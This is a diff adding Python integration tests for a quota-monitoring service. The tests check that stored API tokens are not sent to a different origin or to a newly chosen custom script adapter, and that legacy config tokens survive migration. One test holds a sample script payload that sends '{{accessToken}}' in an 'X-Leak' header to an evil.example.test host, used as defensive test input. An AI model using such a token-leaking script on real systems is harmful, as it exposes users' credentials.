@@ -10,7 +10,7 @@ from pathlib import Path
 import tempfile
 from types import SimpleNamespace as NS
 import unittest
-from unittest.mock import patch
+from unittest.mock import AsyncMock, patch
 
 from astrbot_host.model_api import ModelWebAPI
 from astrbot_host.quota_service import (
@@ -432,6 +432,204 @@ class QuotaWebApiIntegrationTests(unittest.TestCase):
                     self.assertEqual(res_del["data"]["stations"], [])
 
                 await close_quota_watch_services(ctrl)
+
+        asyncio.run(run())
+
+    def test_test_draft_blocks_stored_token_exfiltration_across_origins_or_script_switch(self):
+        async def run():
+            with tempfile.TemporaryDirectory() as tmp:
+                calls = []
+
+                def router(method, url, kwargs):
+                    calls.append((method, url, dict(kwargs.get("headers") or {})))
+                    if url.endswith("/api/status"):
+                        return _FakeResponse(200, {"success": True, "data": {"quota_display_type": "USD", "quota_per_unit": 500000}})
+                    return _FakeResponse(200, {"success": True, "data": {"quota": 500000, "used_quota": 0}})
+
+                ctrl = _make_controller(tmp)
+                svc = get_quota_watch_service(ctrl, Path(tmp), session_factory=_mock_factory(router)[0])
+                _, _, tok = svc.store.read()
+                svc.store.upsert_station(
+                    tok,
+                    {
+                        "id": "st1",
+                        "name": "原站",
+                        "adapter_id": "newapi",
+                        "base_url": "https://origin-a.example.test",
+                        "auth_token": "secret-origin-a-tok",
+                    },
+                )
+
+                # Same origin reuses stored token cleanly
+                res_same = await svc.test_draft({
+                    "id": "st1",
+                    "name": "原站",
+                    "adapter_id": "newapi",
+                    "base_url": "https://origin-a.example.test/v1",
+                    "auth_token": "",
+                })
+                self.assertTrue(res_same["snapshot"]["ok"])
+                self.assertTrue(any(h.get("Authorization") == "Bearer secret-origin-a-tok" for _, u, h in calls if "origin-a.example.test" in u))
+
+                # Different origin MUST NOT receive stored token
+                calls.clear()
+                res_cross = await svc.test_draft({
+                    "id": "st1",
+                    "name": "原站",
+                    "adapter_id": "newapi",
+                    "base_url": "https://evil-b.example.test",
+                    "auth_token": "",
+                })
+                self.assertFalse(res_cross["snapshot"]["ok"])
+                self.assertEqual(res_cross["snapshot"]["error_code"], "missing_credentials")
+                self.assertFalse(any("secret-origin-a-tok" in json.dumps(h) for _, _, h in calls))
+
+                # Switching from non-script adapter to custom_script MUST NOT receive stored token
+                with patch("astrbot_host.quota_adapters.script_adapter.ScriptServiceBalancePort") as mock_script:
+                    mock_script.return_value.fetch = AsyncMock(side_effect=RuntimeError("no token"))
+                    await svc.test_draft({
+                        "id": "st1",
+                        "name": "原站",
+                        "adapter_id": "custom_script",
+                        "base_url": "https://origin-a.example.test",
+                        "auth_token": "",
+                        "custom_script": "({request:{url:'https://evil.example.test',headers:{'X-Leak':'{{accessToken}}'}},extractor:r=>({remaining:1})})",
+                    })
+                    if mock_script.called:
+                        _, kwargs = mock_script.call_args
+                        self.assertEqual(kwargs.get("access_token", ""), "")
+                        self.assertEqual(kwargs.get("api_key", ""), "")
+
+                await close_quota_watch_services(ctrl)
+
+        asyncio.run(run())
+
+    def test_legacy_projection_materializes_cleanly_on_edit_and_awareness_save(self):
+        async def run():
+            with tempfile.TemporaryDirectory() as tmp:
+                ctrl = _make_controller(
+                    tmp,
+                    config={
+                        "service_balance": {
+                            "url": "https://legacy.example.test",
+                            "api_key": "legacy-secret-tok-777",
+                            "value_divisor": "500000",
+                        }
+                    },
+                )
+
+                def router(method, url, _kw):
+                    if url.endswith("/api/status"):
+                        return _FakeResponse(200, {"success": True, "data": {"quota_display_type": "USD", "quota_per_unit": 500000}})
+                    if url.endswith("/api/user/self"):
+                        return _FakeResponse(200, {"success": True, "data": {"quota": 5_000_000, "used_quota": 0}})
+                    return _FakeResponse(200, {"success": True, "data": {"items": []}})
+
+                get_quota_watch_service(ctrl, Path(tmp), session_factory=_mock_factory(router)[0])
+                api = ModelWebAPI(ctrl)
+
+                async def fake_auth(allow_query_keys=()):
+                    return (ctrl.session, NS(), NS(), None)
+
+                with patch.object(api, "_run_authorized_read", side_effect=fake_auth):
+                    # Initial dashboard shows legacy_projected=True with legacy-default
+                    with patch("astrbot_host.quota_api.request", _FakeRequest()):
+                        res0 = await api._quota_api.dashboard()
+                    self.assertTrue(res0["data"]["legacy_projected"])
+                    self.assertEqual(res0["data"]["stations"][0]["id"], "legacy-default")
+                    self.assertTrue(res0["data"]["stations"][0]["has_token"])
+                    tok0 = res0["data"]["edit_token"]
+
+                    # Deleting unmaterialized legacy projection returns explicit quota_legacy_readonly
+                    with patch(
+                        "astrbot_host.quota_api.request",
+                        _FakeRequest(body={"edit_token": tok0, "station_id": "legacy-default"}),
+                    ):
+                        res_del = await api._quota_api.delete_station()
+                    self.assertEqual(res_del["status"], "error")
+                    self.assertEqual(res_del["data"]["code"], "quota_legacy_readonly")
+
+                    # Saving awareness policy targeting legacy-default materializes store cleanly
+                    with patch(
+                        "astrbot_host.quota_api.request",
+                        _FakeRequest(body={
+                            "edit_token": tok0,
+                            "awareness": {"mode": "primary", "primary_station_id": "legacy-default", "target_currency": "CNY"},
+                        }),
+                    ):
+                        res_aw = await api._quota_api.save_awareness()
+                    self.assertEqual(res_aw["status"], "ok")
+                    self.assertFalse(res_aw["data"]["legacy_projected"])
+                    tok1 = res_aw["data"]["edit_token"]
+
+                    # Verify legacy token survived materialization and blank-token edit still preserves it!
+                    svc = get_quota_watch_service(ctrl, Path(tmp))
+                    stored, _, _ = svc.store.read()
+                    self.assertEqual(stored[0].auth_token, "legacy-secret-tok-777")
+
+                    with patch(
+                        "astrbot_host.quota_api.request",
+                        _FakeRequest(body={
+                            "edit_token": tok1,
+                            "station": {
+                                "id": "legacy-default",
+                                "name": "已升级旧站点",
+                                "adapter_id": "newapi",
+                                "base_url": "https://legacy.example.test",
+                                "auth_token": "",
+                            },
+                            "probe_after_save": False,
+                        }),
+                    ):
+                        res_edit = await api._quota_api.save_station()
+                    self.assertEqual(res_edit["status"], "ok")
+                    stored2, _, _ = svc.store.read()
+                    self.assertEqual(stored2[0].name, "已升级旧站点")
+                    self.assertEqual(stored2[0].auth_token, "legacy-secret-tok-777")
+
+                await close_quota_watch_services(ctrl)
+
+            # Also verify editing legacy-default directly (before save_awareness) preserves legacy token
+            with tempfile.TemporaryDirectory() as tmp2:
+                ctrl2 = _make_controller(
+                    tmp2,
+                    config={
+                        "service_balance": {
+                            "url": "https://legacy2.example.test",
+                            "api_key": "legacy-direct-tok-888",
+                            "value_divisor": "500000",
+                        }
+                    },
+                )
+                get_quota_watch_service(ctrl2, Path(tmp2), session_factory=_mock_factory({})[0])
+                api2 = ModelWebAPI(ctrl2)
+
+                async def fake_auth2(allow_query_keys=()):
+                    return (ctrl2.session, NS(), NS(), None)
+
+                with patch.object(api2, "_run_authorized_read", side_effect=fake_auth2):
+                    with patch("astrbot_host.quota_api.request", _FakeRequest()):
+                        d0 = await api2._quota_api.dashboard()
+                    with patch(
+                        "astrbot_host.quota_api.request",
+                        _FakeRequest(body={
+                            "edit_token": d0["data"]["edit_token"],
+                            "station": {
+                                "id": "legacy-default",
+                                "name": "直接编辑迁移",
+                                "adapter_id": "newapi",
+                                "base_url": "https://legacy2.example.test",
+                                "auth_token": "",
+                            },
+                            "probe_after_save": False,
+                        }),
+                    ):
+                        r_ed = await api2._quota_api.save_station()
+                    self.assertEqual(r_ed["status"], "ok")
+                    self.assertFalse(r_ed["data"]["legacy_projected"])
+                    stored3, _, _ = get_quota_watch_service(ctrl2, Path(tmp2)).store.read()
+                    self.assertEqual(stored3[0].auth_token, "legacy-direct-tok-888")
+                await close_quota_watch_services(ctrl2)
 
         asyncio.run(run())
 
